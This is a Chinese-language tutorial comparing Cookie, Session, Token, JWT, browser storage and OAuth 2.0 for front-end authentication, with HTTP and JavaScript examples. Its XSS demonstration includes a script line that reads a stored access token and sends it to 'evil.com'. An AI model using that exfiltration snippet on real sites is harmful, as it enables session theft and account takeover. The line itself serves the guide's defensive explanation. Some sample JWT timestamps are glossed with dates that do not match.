## 1. 概念介绍

前端和后端在做“登录、鉴权、保持会话、访问受保护资源”时，经常会同时接触下面这些概念：

- `Cookie`
- `Session`
- `Token`
- `JWT`
- `localStorage`
- `sessionStorage`
- `OAuth 2.0`

它们总被放在一起，是因为它们都在回答同一类问题：

1. 用户登录后，系统如何记住“你是谁”？
2. 浏览器后续请求时，如何把“身份凭证”带给服务端？
3. 服务端如何校验这个请求是否有权限？
4. 凭证应该放在哪里更安全？

所以你可以把它们理解成一条链上的不同组件：

- `Cookie`：浏览器自动携带的小型存储载体。
- `Session`：服务端保存的会话状态。
- `Token`：客户端携带的身份或授权凭证。
- `JWT`：一种常见的 Token 格式。
- `localStorage` / `sessionStorage`：前端可读写的浏览器本地存储。
- `OAuth 2.0`：更偏授权框架，不是简单登录态存储机制。

## 2. 先从 HTTP 的特点说起

### 2.1 HTTP 是无状态协议

HTTP 本身是无状态的，意思是：

- 服务端只看当前这一次请求。
- 单独看一条 HTTP 请求，服务端并不知道这个请求是不是“刚才那个用户”发来的。

例如：

1. 第一次请求是登录。
2. 第二次请求是查订单。
3. 第三次请求是修改资料。

如果没有额外机制，服务端无法天然知道这三次请求来自同一个用户。

所以登录态、本地凭证、会话机制，本质上都是在弥补 HTTP 的无状态特性。

### 2.2 所有鉴权方案都在解决“如何跨请求识别用户”

常见方案可以粗略分成两类：

- **服务端有状态**：典型是 `Session`
- **客户端带状态凭证**：典型是 `Token` / `JWT`

而 `Cookie` 常常只是这两类方案的“载体”之一。

## 3. Cookie 是什么

### 3.1 Cookie 的本质

Cookie 是浏览器保存的一小段键值数据，通常由服务端通过 `Set-Cookie` 响应头下发。

浏览器后续访问符合条件的请求时，会自动把 Cookie 带上。

#### 实际数据示例

**服务端响应（设置 Cookie）：**

```http
HTTP/1.1 200 OK
Set-Cookie: sessionId=abc123def456; Path=/; HttpOnly; Secure; SameSite=Lax
Set-Cookie: theme=dark; Path=/; Max-Age=3600
Set-Cookie: userPreference=lang%3Dzh; Domain=.example.com
```

**浏览器后续请求（自动携带 Cookie）：**

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Cookie: sessionId=abc123def456; theme=dark; userPreference=lang%3Dzh
```

**在浏览器开发者工具中看到的 Cookie：**

```javascript
// Application > Cookies
[
  {
    "name": "sessionId",
    "value": "abc123def456",
    "domain": "example.com",
    "path": "/",
    "expires": "Session",
    "httpOnly": true,
    "secure": true,
    "sameSite": "Lax"
  },
  {
    "name": "theme",
    "value": "dark",
    "domain": "example.com",
    "path": "/",
    "expires": "2026-03-13T15:30:00.000Z",
    "httpOnly": false,
    "secure": false,
    "sameSite": "Lax"
  }
]
```

所以 Cookie 本质上是：

- 一种浏览器侧存储机制
- 一种自动随请求发送的凭证载体

### 3.2 Cookie 的特点

Cookie 的核心特点有：

- 由浏览器管理。
- 可以设置过期时间。
- 浏览器会自动随请求带上。
- 是否发送与域名、路径、协议、SameSite 等规则相关。

### 3.3 常见 Cookie 属性

| 属性 | 作用 | 常见意义 |
| --- | --- | --- |
| `Domain` | 指定哪些域可以携带该 Cookie | 控制子域共享 |
| `Path` | 指定哪些路径会带上 Cookie | 限制作用范围 |
| `Expires` / `Max-Age` | 指定过期时间 | 控制生命周期 |
| `HttpOnly` | 前端 JS 不能读取 | 降低 XSS 窃取风险 |
| `Secure` | 只在 HTTPS 下发送 | 防止明文传输泄漏 |
| `SameSite` | 控制跨站请求是否带上 Cookie | 降低 CSRF 风险 |

### 3.4 Cookie 的优点

- 浏览器自动携带，前端使用简单。
- 很适合传统服务端渲染网站。
- 和 `Session` 组合使用非常成熟。

### 3.5 Cookie 的问题

- 它本身不是“鉴权方案”，只是存储和传输载体。
- 浏览器自动带 Cookie，容易成为 `CSRF` 攻击成立的前提。
- 如果没有 `HttpOnly`，还可能被 `XSS` 读取。
- 大小有限，不适合放太多业务数据。

## 4. Session 是什么

### 4.1 Session 的本质

Session 是服务端保存的一份会话状态。

典型流程是：

1. 用户登录成功。
2. 服务端创建一份 Session 数据，例如：
   - 用户 ID
   - 登录时间
   - 权限信息
3. 服务端生成一个 `sessionId`。
4. 把 `sessionId` 通过 Cookie 发给浏览器。
5. 浏览器后续请求自动带上 `sessionId`。
6. 服务端根据 `sessionId` 去查对应 Session，确认用户身份。

所以：

- **真正的用户状态在服务端**
- **浏览器里通常只保存一个 Session 标识**

### 4.2 Session 的典型结构

可以简单理解成：

```text
浏览器 Cookie：sessionId=abc123

服务端 Session 存储：
abc123 -> {
  userId: 1001,
  role: "admin",
  loginTime: ...
}
```

#### 实际数据示例

**浏览器中的 Cookie：**

```http
Cookie: JSESSIONID=A1B2C3D4E5F6G7H8; Path=/; HttpOnly
```

**服务端 Redis/Memory 中存储的 Session 数据：**

```javascript
// Redis 中的存储
{
  "JSESSIONID:A1B2C3D4E5F6G7H8": {
    "userId": 1001,
    "username": "zhangsan",
    "role": ["user", "admin"],
    "loginTime": "2026-03-13T08:00:00Z",
    "lastAccessTime": "2026-03-13T10:30:00Z",
    "ip": "192.168.1.100",
    "browser": "Chrome/123.0.0.0",
    "csrfToken": "xyz789abc456",
    "cart": [
      {"productId": 101, "quantity": 2},
      {"productId": 205, "quantity": 1}
    ]
  }
}
```

**服务端代码示例（Node.js + Express）：**

```javascript
// 登录成功后创建 Session
req.session.user = {
  id: 1001,
  username: 'zhangsan',
  role: ['user', 'admin']
};
req.session.loginTime = new Date();
req.session.csrfToken = generateCSRFToken();

// 后续请求中读取 Session
app.get('/api/profile', (req, res) => {
  const userId = req.session.user?.id;
  // 使用 userId 查询数据库返回用户信息
});
```

**多服务共享 Session（Redis 方案）：**

```javascript
// 服务 A
const session = await redis.get(`session:${sessionId}`);
const userData = JSON.parse(session);

// 服务 B
const session = await redis.get(`session:${sessionId}`);
const userData = JSON.parse(session);
// 两边都能读到相同的 Session 数据
```

### 4.3 Session 的优点

- 服务端完全掌控会话状态。
- 失效、下线、踢人、权限变更比较容易控制。
- 服务端可以随时删除 Session，让某个登录态立刻失效。

### 4.4 Session 的问题

- 服务端要保存状态，会增加内存或存储压力。
- 分布式部署时要解决 Session 共享问题。
- 常见做法是：
  - Session 复制
  - 负载均衡粘性会话
  - Redis 共享 Session

### 4.5 Session 适合什么场景

常见适用场景：

- 传统 Web 网站
- 服务端渲染页面
- 后台管理系统
- 以浏览器为主、前后端耦合较高的系统

## 5. Cookie 和 Session 的关系

这两个概念经常被混淆，但它们不是一回事。

### 5.1 它们的关系

- `Cookie` 是浏览器侧存储和传输机制。
- `Session` 是服务端侧会话状态。

常见组合是：

- **用 Cookie 存 `sessionId`**
- **用 Session 存用户状态**

### 5.2 一个常见误区

很多人会说“Cookie 不安全，所以不用 Session”。

这句话其实不严谨。

更准确的说法应该是：

- Session 方案通常也依赖 Cookie 传 `sessionId`
- 风险点在于 Cookie 如何配置、服务端如何校验、是否存在 CSRF / XSS

所以不是“Cookie 和 Session 二选一”，而是：

- **Session 常常借助 Cookie 工作**

## 6. Token 是什么

### 6.1 Token 的本质

Token 本质上是一个**凭证字符串**，客户端持有它，服务端看到它后可以：

- 识别用户身份
- 判断权限
- 判断是否允许访问资源

你可以把它理解成：

- 一张临时通行证
- 一把访问某些资源的钥匙

### 6.2 Token 和 Session 的核心区别

Session 方案通常是：

- 浏览器带 `sessionId`
- 服务端查状态

Token 方案通常是：

- 客户端主动带 Token
- 服务端校验 Token 内容或到认证中心校验

所以核心区别在于：

- `Session` 更偏**服务端持状态**
- `Token` 更偏**客户端带凭证**

### 6.3 Token 常见放在哪里

Token 可以放在：

- `Authorization` 请求头
- `HttpOnly Cookie`
- `localStorage`
- `sessionStorage`
- 内存变量

但不同存放位置，安全性差异很大，后面会详细讲。

### 6.4 Bearer Token

前端最常见的是：

```http
Authorization: Bearer <token>
```

Bearer 的意思是：

- 谁拿到这个 Token，谁就可以使用它

所以它的核心风险是：

- **一旦泄漏就可能被直接盗用**

#### 实际数据示例

**完整的 HTTP 请求示例：**

```http
GET /api/user/orders HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInVzZXJuYW1lIjoiemhhbmdzYW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3ODQwMDAwMDB9.abc123def456ghi789jkl012mno345pqr456stu789vwx012yz
Content-Type: application/json
```

**前端代码中的 Token 使用：**

```javascript
// 登录后保存 Token
const loginResponse = await fetch('/api/login', {
  method: 'POST',
  body: JSON.stringify({ username, password })
});
const { accessToken, refreshToken } = await loginResponse.json();

// 保存到 localStorage
localStorage.setItem('access_token', accessToken);

// 后续请求携带 Token
const response = await fetch('/api/user/profile', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('access_token')}`
  }
});
```

## 7. JWT 是什么

### 7.1 JWT 的本质

JWT（JSON Web Token）是一种 Token 格式。

它通常由三部分组成：

```text
Header.Payload.Signature
```

所以 JWT 不是“另一种认证体系”，而是：

- Token 的一种实现方式

### 7.2 JWT 里通常放什么

常见字段包括：

- 用户 ID
- 签发者 `iss`
- 过期时间 `exp`
- 签发时间 `iat`
- 主题 `sub`
- 唯一标识 `jti`
- 权限或角色信息

#### 实际数据示例

**完整的 JWT 字符串：**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInVzZXJuYW1lIjoiemhhbmdzYW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODQwMDAwMDAsImV4cCI6MTc4NDA4NjQwMCwiaXNzIjoiaHR0cHM6Ly9leGFtcGxlLmNvbSIsInN1YiI6ImF1dGgifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**JWT 解码后的三部分：**

```javascript
// Header（头部）
{
  "alg": "HS256",    // 签名算法
  "typ": "JWT"       // 令牌类型
}
// Base64 编码后：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9

// Payload（负载）
{
  "userId": 1001,
  "username": "zhangsan",
  "role": "admin",
  "permissions": ["read", "write", "delete"],
  "iat": 1784000000,     // 签发时间：2026-03-13 08:00:00
  "exp": 1784086400,     // 过期时间：2026-03-14 08:00:00 (24小时后)
  "iss": "https://example.com",  // 签发者
  "sub": "auth"          // 主题
}
// Base64 编码后：eyJ1c2VySWQiOjEwMDEsInVzZXJuYW1lIjoiemhhbmdzYW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODQwMDAwMDAsImV4cCI6MTc4NDA4NjQwMCwiaXNzIjoiaHR0cHM6Ly9leGFtcGxlLmNvbSIsInN1YiI6ImF1dGgifQ

// Signature（签名）
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  your-256-bit-secret
)
// 签名结果：SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**在线解码 JWT 的效果：**

访问 https://jwt.io/ 解码后会看到：

```json
{
  "userId": 1001,
  "username": "zhangsan",
  "role": "admin",
  "permissions": ["read", "write", "delete"],
  "iat": 1784000000,
  "exp": 1784086400,
  "iss": "https://example.com",
  "sub": "auth"
}
```

**前端使用 JWT 的完整示例：**

```javascript
// 登录获取 JWT
const response = await fetch('https://api.example.com/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'zhangsan',
    password: 'password123'
  })
});

const { accessToken, refreshToken } = await response.json();

// accessToken 是 JWT
localStorage.setItem('access_token', accessToken);

// 解码 JWT 查看内容（不需要密钥）
function decodeJWT(token) {
  const base64Url = token.split('.')[1];
  const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
  const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
  }).join(''));
  return JSON.parse(jsonPayload);
}

const decoded = decodeJWT(accessToken);
console.log(decoded);
// 输出：
// {
//   userId: 1001,
//   username: "zhangsan",
//   role: "admin",
//   permissions: ["read", "write", "delete"],
//   iat: 1784000000,
//   exp: 1784086400,
//   iss: "https://example.com",
//   sub: "auth"
// }

// 检查 Token 是否过期
function isTokenExpired(token) {
  const decoded = decodeJWT(token);
  const now = Date.now() / 1000;
  return decoded.exp < now;
}

// 后续请求携带 JWT
fetch('https://api.example.com/user/orders', {
  headers: {
    'Authorization': `Bearer ${accessToken}`
  }
});
```

### 7.3 JWT 的优点

- 自描述，服务端不一定需要查库就能知道基本信息。
- 适合分布式系统，跨服务传递方便。
- 和 OAuth 2.0、SSO、API 网关体系兼容性好。

### 7.4 JWT 的问题

- JWT 默认是**签名**，不是加密，Payload 可被解码查看。
- 一旦签发出去，在完全无状态设计下很难“立刻让单个 JWT 失效”。
- 如果 Payload 放太多内容，会让 Token 很大。
- 如果放在 `localStorage`，会受到 XSS 风险影响。

### 7.5 JWT 和 Token 的关系

关系非常简单：

- **JWT 是 Token 的一种格式**
- **Token 不一定是 JWT**

所以不能说：

- “Token 就是 JWT”
- “JWT 就是所有登录态方案”

## 8. Session 和 JWT / Token 怎么选

### 8.1 Session 更偏服务端有状态

特点：

- 服务端掌握会话。
- 强制下线方便。
- 用户状态变更可立即生效。

适合：

- 后台系统
- 传统 Web 系统
- 强依赖服务端集中会话控制的系统

### 8.2 JWT / Token 更偏客户端携带凭证

特点：

- 更适合前后端分离。
- 更适合多服务、网关、跨端调用。
- 服务端横向扩展更方便。

但要额外处理：

- 刷新机制
- 主动失效
- 黑名单
- Token 轮换

### 8.3 一个务实结论

不是说 JWT 一定比 Session 高级。

更准确的说：

- **传统网站常用 Session**
- **前后端分离、API 化、开放平台常用 Token / JWT**

## 9. 前端常见存储位置：Cookie、localStorage、sessionStorage、内存

### 9.1 Cookie

优点：

- 浏览器自动携带。
- 可配置 `HttpOnly`，JS 无法读取。

缺点：

- 自动发送，容易引出 `CSRF` 风险。
- 容量较小。
- 跨站请求策略更复杂。

#### 在浏览器中查看 Cookie

**Chrome 开发者工具：**

```javascript
// Application > Storage > Cookies > https://example.com
// 可以看到：

Name          Value              Domain        Path   Expires    HttpOnly  Secure  SameSite
sessionId     A1B2C3D4E5F6       .example.com  /      Session    ✓         ✓       Lax
accessToken   eyJhbGciOi...      example.com   /      7 days     ✗         ✓       Strict
theme         dark               example.com   /      2026-04-13 ✗         ✗       Lax
userLang      zh                 .example.com  /      1 year      ✗         ✗       Lax
```

**通过 JavaScript 操作 Cookie：**

```javascript
// 设置 Cookie
document.cookie = "theme=dark; path=/; max-age=3600";

// 读取 Cookie（只能读取非 HttpOnly 的）
console.log(document.cookie);
// 输出: "theme=dark; userLang=zh"
// 注意：读不到 HttpOnly 的 Cookie（如 sessionId、accessToken）

// 删除 Cookie
document.cookie = "theme=; path=/; max-age=0";
```

**完整的安全 Cookie 示例：**

```http
// 登录响应
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600

// 前端 JavaScript 读取
document.cookie // 返回空字符串或非敏感 Cookie，sessionId 无法读取
```

### 9.2 localStorage

特点：

- 持久化存储。
- 关闭浏览器后仍然存在。
- 前端 JS 可读可写。

优点：

- 用起来简单。
- 适合保存非敏感持久化信息。

缺点：

- 一旦站点有 XSS，攻击脚本就可能直接读取。
- 不会自动随请求发送，需要前端手动加到请求头。

#### 实际数据示例

**在浏览器开发者工具中查看：**

```javascript
// Application > Local Storage > https://example.com

// 存储的数据示例
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDF9.abc123",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDF9.def456",
  "user_preferences": "{\"theme\":\"dark\",\"lang\":\"zh\",\"fontSize\":16}",
  "cart_items": "[{\"id\":101,\"name\":\"商品A\",\"quantity\":2}]",
  "last_visit": "2026-03-13T10:30:00.000Z"
}
```

**JavaScript 操作 localStorage：**

```javascript
// 存储数据
localStorage.setItem('access_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
localStorage.setItem('user_preferences', JSON.stringify({
  theme: 'dark',
  lang: 'zh',
  fontSize: 16
}));

// 读取数据
const token = localStorage.getItem('access_token');
const preferences = JSON.parse(localStorage.getItem('user_preferences'));

// 遍历所有 localStorage 数据
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}

// 删除数据
localStorage.removeItem('access_token');

// 清空所有数据
localStorage.clear();
```

**常见的 Token 存储方式：**

```javascript
// 存储 JWT
const authData = {
  accessToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
  refreshToken: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
  expiresAt: 1784086400
};
localStorage.setItem('auth', JSON.stringify(authData));

// 使用时取出
const auth = JSON.parse(localStorage.getItem('auth'));
if (Date.now() / 1000 < auth.expiresAt) {
  // Token 未过期，可以使用
  fetch('/api/user/profile', {
    headers: {
      'Authorization': `Bearer ${auth.accessToken}`
    }
  });
}
```

**⚠️ XSS 风险演示：**

```javascript
// 如果页面存在 XSS 漏洞，攻击者注入的脚本可以这样窃取 Token：
// <script>
const stolenToken = localStorage.getItem('access_token');
// 发送到攻击者的服务器
fetch('https://evil.com/steal?token=' + stolenToken);
// </script>
```

### 9.3 sessionStorage

特点：

- 只在当前标签页会话内有效。
- 标签页关闭后一般失效。
- 也是前端 JS 可读可写。

优点：

- 生命周期比 localStorage 短。

缺点：

- 同样会受到 XSS 风险影响。

#### 实际数据示例

**在浏览器开发者工具中查看：**

```javascript
// Application > Session Storage > https://example.com

// 存储的数据示例
{
  "csrf_token": "abc123def456",
  "temp_form_data": "{\"username\":\"zhangsan\",\"email\":\"test@example.com\"}",
  "page_scroll_position": "{\"x\":0,\"y\":1250}"
}
```

**JavaScript 操作 sessionStorage：**

```javascript
// 存储 CSRF Token
sessionStorage.setItem('csrf_token', 'abc123def456');

// 临时保存表单数据（页面刷新后仍然存在）
const formData = {
  username: 'zhangsan',
  email: 'test@example.com',
  phone: '13800138000'
};
sessionStorage.setItem('temp_form_data', JSON.stringify(formData));

// 保存滚动位置
window.addEventListener('scroll', () => {
  const scrollPosition = {
    x: window.scrollX,
    y: window.scrollY
  };
  sessionStorage.setItem('page_scroll_position', JSON.stringify(scrollPosition));
});

// 页面加载时恢复滚动位置
window.addEventListener('load', () => {
  const savedPosition = sessionStorage.getItem('page_scroll_position');
  if (savedPosition) {
    const { x, y } = JSON.parse(savedPosition);
    window.scrollTo(x, y);
  }
});

// 提交表单后清除临时数据
sessionStorage.removeItem('temp_form_data');
```

**localStorage vs sessionStorage 对比：**

```javascript
// localStorage - 在多个标签页之间共享
localStorage.setItem('test', 'value1');
// 打开新的标签页访问同一个网站，新标签页也能读取到这个值

// sessionStorage - 只在当前标签页有效
sessionStorage.setItem('test', 'value2');
// 打开新的标签页，新标签页读取不到这个值
// 当前标签页刷新后，数据仍然存在
// 关闭当前标签页后，数据被清除
```

### 9.4 内存变量

例如：

- Vue / React 状态管理
- JS 运行时内存

优点：

- 页面刷新后自动消失。
- 不容易被持久化窃取。

缺点：

- 页面一刷新就没了，需要配合刷新 token 或重新登录机制。

#### 实际数据示例

**React 状态管理示例：**

```javascript
import { createContext, useContext, useState } from 'react';

// Auth Context
const AuthContext = createContext();

function AuthProvider({ children }) {
  // Token 只保存在内存中
  const [accessToken, setAccessToken] = useState(null);
  const [user, setUser] = useState(null);

  const login = async (username, password) => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    const data = await response.json();

    // 保存在内存中，页面刷新后会丢失
    setAccessToken(data.accessToken);
    setUser(data.user);
  };

  const logout = () => {
    setAccessToken(null);
    setUser(null);
  };

  return (
    <AuthContext.Provider value={{ accessToken, user, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

// 使用
function UserProfile() {
  const { accessToken, user } = useContext(AuthContext);

  if (!accessToken) {
    return <div>请先登录</div>;
  }

  return (
    <div>
      <h1>欢迎, {user.username}</h1>
      {/* 使用 accessToken 调用 API */}
    </div>
  );
}
```

**Vue 状态管理示例：**

```javascript
import { createStore } from 'vuex';

const authStore = createStore({
  state() {
    return {
      accessToken: null,  // 内存中存储
      refreshToken: null,
      user: null
    };
  },
  mutations: {
    setAuth(state, { accessToken, refreshToken, user }) {
      state.accessToken = accessToken;
      state.refreshToken = refreshToken;
      state.user = user;
    },
    clearAuth(state) {
      state.accessToken = null;
      state.refreshToken = null;
      state.user = null;
    }
  },
  actions: {
    async login({ commit }, { username, password }) {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      const data = await response.json();
      commit('setAuth', data);
    }
  }
});
```

**全局变量方式（不推荐，但常见）：**

```javascript
// 全局变量存储 Token
window.auth = {
  accessToken: null,
  user: null
};

// 登录后保存
async function login(username, password) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
  });
  const data = await response.json();
  window.auth.accessToken = data.accessToken;
  window.auth.user = data.user;
}

// 使用 Token
async function fetchUserProfile() {
  const response = await fetch('/api/user/profile', {
    headers: {
      'Authorization': `Bearer ${window.auth.accessToken}`
    }
  });
  return response.json();
}
```

**内存 + HttpOnly Cookie 混合方案（推荐）：**

```javascript
// 短期 Access Token 保存在内存
class AuthManager {
  constructor() {
    this.accessToken = null;  // 内存中
  }

  // 刷新 Token（从 HttpOnly Cookie）
  async refreshAccessToken() {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'  // 自动携带 HttpOnly Cookie 中的 refresh token
    });
    const data = await response.json();
    this.accessToken = data.accessToken;  // 新的 access token 放内存
    return this.accessToken;
  }

  // 获取 Token（带自动刷新）
  async getAccessToken() {
    if (!this.accessToken) {
      await this.refreshAccessToken();
    }
    return this.accessToken;
  }

  // 调用 API
  async fetchAPI(url, options = {}) {
    const token = await this.getAccessToken();
    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`
      }
    });
  }
}

const authManager = new AuthManager();

// 使用
authManager.fetchAPI('/api/user/profile')
  .then(response => response.json())
  .then(data => console.log(data));
```

## 10. 前端到底应该把 Token 放在哪里

这是一个没有绝对银弹的问题，本质是在不同风险之间做权衡。

### 10.1 放在 localStorage 的特点

优点：

- 实现简单。
- 前端容易控制。
- 不会自动带到跨站请求里，传统 CSRF 风险会下降。

缺点：

- 容易被 XSS 直接读取。

### 10.2 放在 HttpOnly Cookie 的特点

优点：

- 前端 JS 读不到，XSS 直接窃取难度更高。

缺点：

- 浏览器会自动带 Cookie，请求侧要重点防 CSRF。
- 前后端跨域、SameSite、CORS 配置更复杂。

### 10.3 一个常见务实方案

很多系统会采用：

- **短期 Access Token 放内存**
- **长期 Refresh Token 放 HttpOnly Cookie**

优点是：

- 降低 Access Token 长时间暴露风险
- 降低 Refresh Token 被前端 JS 读取的风险

但这会增加实现复杂度。

### 10.4 一个重要结论

不要追求“绝对安全的单一存放位置”，更要关注：

- 是否有 XSS 防护
- 是否有 CSRF 防护
- 是否强制 HTTPS
- Token 是否短期有效
- 是否支持刷新与吊销

## 11. Cookie / Session / Token / JWT 的典型登录流程

### 11.1 Session 方案流程

1. 用户登录提交用户名密码。
2. 服务端验证成功。
3. 服务端创建 Session。
4. 服务端把 `sessionId` 通过 Cookie 发给浏览器。
5. 浏览器后续自动带上 Cookie。
6. 服务端根据 `sessionId` 查 Session，识别用户。

### 11.2 Token / JWT 方案流程

1. 用户登录提交用户名密码。
2. 服务端验证成功。
3. 服务端签发 `access token`，有时还会签发 `refresh token`。
4. 前端保存这些凭证。
5. 后续调用 API 时，前端主动把 `Authorization: Bearer <token>` 加到请求头。
6. 服务端校验 Token，有效则返回资源。

### 11.3 OAuth 2.0 场景流程

OAuth 2.0 更偏“第三方授权 / 统一认证中心”。

典型流程是：

1. 前端跳到授权服务器。
2. 用户在授权服务器登录并同意授权。
3. 前端或后端拿到授权码 `code`。
4. 再去换 `access token`。
5. 用 `access token` 调资源接口。

这比简单 Cookie / Session 登录更像“统一授权体系”。

## 12. 前端相关的几个高频安全问题

### 12.1 XSS

XSS 的本质是：

- 攻击者把恶意脚本注入页面并在站内上下文执行。

它和前端存储最相关的风险是：

- 读取 `localStorage`
- 读取 `sessionStorage`
- 读取非 `HttpOnly` Cookie
- 冒充当前页面发起合法请求

所以：

- 如果站点存在 XSS，很多“前端保存 Token”的方案都会出事。

### 12.2 CSRF

CSRF 的本质是：

- 利用浏览器会自动携带 Cookie 的特性，伪造用户请求。

它成立的典型前提是：

1. 用户已经登录某站点。
2. 浏览器会自动带上该站点 Cookie。
3. 服务端只看 Cookie，不校验请求来源和额外令牌。

所以：

- `Cookie + Session` 方案更需要重点防 CSRF。
- `Authorization Bearer Token` 方案下，传统 CSRF 风险通常会下降，但不是说没有其他风险。

### 12.3 SameSite、CSRF Token、Origin 校验

防 CSRF 常见手段有：

- `SameSite` Cookie
- `CSRF Token`
- 校验 `Origin` / `Referer`

### 12.4 HTTPS

无论是 Cookie 还是 Token，只要走明文 HTTP，都有被窃听风险。

所以生产环境里：

- 登录态凭证必须配合 HTTPS

否则其他设计都很难站住。

## 13. OAuth 2.0、OIDC、JWT 和登录态的关系

### 13.1 OAuth 2.0 解决的是授权

OAuth 2.0 更关注：

- 谁能访问什么资源
- 第三方应用如何拿到授权

### 13.2 OIDC 解决的是身份认证

如果是“第三方登录”“统一登录”，真正更完整的体系通常是：

- OAuth 2.0 + OIDC

### 13.3 JWT 常常只是访问令牌格式

在 OAuth 2.0 体系里：

- Access Token 可能是 JWT
- 也可能是 opaque token

所以 OAuth、OIDC、JWT 不是同一个层面的概念。

## 14. 常见应用场景

### 14.1 Cookie + Session

适合：

- 服务端渲染网站
- 后台管理系统
- 内部系统
- 需要强会话控制的系统

### 14.2 Token / JWT

适合：

- 前后端分离系统
- App + H5 + 管理后台多端统一登录
- API 网关和微服务体系
- 开放平台 API

### 14.3 OAuth 2.0 / OIDC

适合：

- 第三方授权登录
- 企业统一身份认证平台
- 单点登录
- 开放平台生态

## 15. 面试里最常见的对比题

### 15.1 Cookie 和 Session 有什么区别

- Cookie 是浏览器存储机制。
- Session 是服务端会话状态。
- 它们经常组合使用：Cookie 里存 `sessionId`，服务端根据它查 Session。

### 15.2 Session 和 Token 有什么区别

- Session 更偏服务端存状态。
- Token 更偏客户端带凭证。
- Session 强控制更方便，Token 更适合分布式和前后端分离。

### 15.3 Token 和 JWT 有什么区别

- Token 是泛称。
- JWT 是 Token 的一种格式。

### 15.4 Cookie 和 localStorage 有什么区别

- Cookie 会自动随请求发送，localStorage 不会。
- Cookie 可设置 `HttpOnly`，localStorage 不行。
- localStorage 更容易被前端脚本访问，也更容易受 XSS 影响。

### 15.5 为什么很多系统不用 Session，改用 JWT

常见原因：

- 前后端分离更方便。
- 分布式扩展更方便。
- 网关和多服务之间更容易传递认证信息。

但这不意味着 JWT 一定更好，只是适配场景不同。

## 16. 一套更实用的理解框架

如果你总是分不清这些概念，可以用下面这个顺序记：

1. **HTTP 无状态**，所以需要登录态机制。
2. **Cookie** 是浏览器存储和自动携带凭证的机制。
3. **Session** 是服务端保存用户状态的方案，通常通过 Cookie 传 `sessionId`。
4. **Token** 是客户端携带凭证的通用说法。
5. **JWT** 是 Token 的一种格式。
6. **localStorage / sessionStorage** 是前端本地存储位置，不是认证协议。
7. **OAuth 2.0 / OIDC** 是更高层的授权 / 身份认证框架。

## 17. 面试里的简洁回答模板

如果面试官让你介绍 `Cookie`、`Session`、`Token`、`JWT`，可以这样回答：

- HTTP 是无状态的，所以系统需要额外机制跨请求识别用户。
- Cookie 是浏览器侧的小型存储，浏览器会自动随请求带上。
- Session 是服务端保存的会话状态，通常通过 Cookie 里的 `sessionId` 关联。
- Token 是客户端携带的凭证，常放在请求头里。
- JWT 是 Token 的一种格式，常用于前后端分离和分布式系统。
- Session 更偏服务端有状态，JWT / Token 更偏客户端携带凭证。
- 前端存放凭证时要重点考虑 XSS、CSRF、HttpOnly、SameSite、HTTPS 和刷新机制。

一句话总结：

**Cookie、Session、Token、JWT 本质上都在解决“登录后如何在后续请求中安全识别用户”的问题，只是状态放置的位置、校验方式和适用场景不同。**
